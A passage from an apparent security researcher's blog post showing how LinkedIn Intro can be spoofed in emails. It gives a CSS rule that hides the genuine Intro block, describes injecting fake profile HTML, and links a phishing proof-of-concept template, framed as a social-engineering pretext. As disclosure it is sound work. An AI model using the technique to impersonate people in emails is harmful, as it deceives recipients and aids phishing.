-<p>Just like setting up a spoofed website, we can simply copy the existing CSS and HTML structure provided by Linkedin, and repurpose it for our needs. The first thing we will want to do is to find a way to get rid of the existing Intro data. We can do this by setting the CSS for the existing Intro block to <code>display:none;</code>. Unfortunately for us, Linkedin obviously considered this, since the CSS is usually injected at the end of our <code>head</code> block, and they were pretty specific in ensuring the <code>!important</code> keyword is set for things such as the display, height, etc.</p>
-
-<p>But they weren&rsquo;t specific enough. If we look at the CSS, we can see that the rules apply to the <code>#rapportive.iphone</code> element. If we look closely, we can see that in fact the HTML element we want to hide has a full spec of <code>#rapportive.rapportive.topbar.iphone</code>. Therefore, we can simply set the following style block to hide the element:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='css'><span class='line'><span class="o">&lt;</span><span class="nt">style</span> <span class="nt">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span><span class="o">&gt;</span>
-</span><span class='line'>    <span class="nf">#rapportive</span><span class="nc">.rapportive.topbar.iphone</span> <span class="p">{</span>
-</span><span class='line'>        <span class="k">display</span><span class="o">:</span><span class="k">none</span> <span class="cp">!important</span><span class="p">;</span>
-</span><span class='line'>    <span class="p">}</span>
-</span><span class='line'><span class="o">&lt;/</span><span class="nt">style</span><span class="o">&gt;</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Easy as that.</p>
-
-<p>Now that we have removed the existing Intro data, we are free to inject our own. To do this, we can copy the existing HTML provided by Linkedin. To make sure that our data is not hidden by our previous CSS, we can simply remove the <code>topbar</code> class from the root element, since it will have no effect on styling. The last things we will want to do are to clean up the margins Linkedin puts on the original message, as well as changing the actual data itself to be whatever we want. In addition to this, I copied some of the CSS and HTML and changed the IDs which are generated automatically. This will make sure our template is always consistent.</p>
-
-<h3>Going Phishing</h3>
-
-<p>I&rsquo;ve taken the liberty of setting up a basic PoC <a href="https://gist.github.com/jordan-wright/7189765#file-template-html">template</a> for educational purposes. To use it, just visit the Linkedin profile for the person you are pretexting as, and fill in the CSS information as needed. Ideally, in the future there could be improvements to automatically scrape this information, check to make sure that the Intro data is only shown on mobile devices, etc. For now &ndash; it works. Let&rsquo;s see what it looks like if I spoof the example from Linkedin&rsquo;s original post, David (pardon the non-IOS7 &ndash; I don&rsquo;t see any major IOS7 styling issues which would cause much trouble):</p>
-
-<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/david.png" target="_blank"><img style="display:block; margin:auto;" src="http://jordan-wright.github.io/images/blog/intro_phish/david.png"/></a></p>
-
-<p>Here&rsquo;s what the details look like when I open the Intro tab (they are customizable as well &ndash; I left them as me to show that I really do control the content):</p>
-
-<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/david_details.png" target="_blank"><img style="display:block; margin:auto;" src="http://jordan-wright.github.io/images/blog/intro_phish/david_details.png"/></a></p>
-
-<p>Obviously, this was an extremely benign example. It would be just as easy to attach a malicious payload, request sensitive information, etc.</p>
-
-<h3>Final Thoughts</h3>
-
-<p>While Linkedin Intro <em>seems</em> like it would be useful on the surface &ndash; the security risks of using it are simply too high. With that being said, as a social engineer, <strong><em>I hope my targets use Intro</em></strong>. By giving users a false sense of security when they see the Intro information in an email, Linkedin has made my pretext much stronger and the SE engagement that much easier.</p>
-
-<p>I have yet to get comments setup on the new blog, but <a href="http://jordan-wright.github.io/contact">shoot me an email</a> if you have any questions or comments!</p>
-
-<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
 ]]></content>
   </entry>
   
